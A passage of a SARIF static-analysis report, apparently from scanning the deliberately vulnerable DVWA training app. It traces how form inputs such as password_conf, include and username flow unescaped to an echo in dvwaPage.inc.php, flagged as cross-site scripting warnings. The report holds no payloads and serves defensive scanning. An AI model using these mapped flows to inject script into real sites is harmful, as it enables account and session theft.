        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4654",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "BF11E3B3681BD18689DCE5DC975DAD9A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:39 - medium.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:55 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 55
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:16 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4660",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C39452248A222F8CBE83563BF94E8232"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
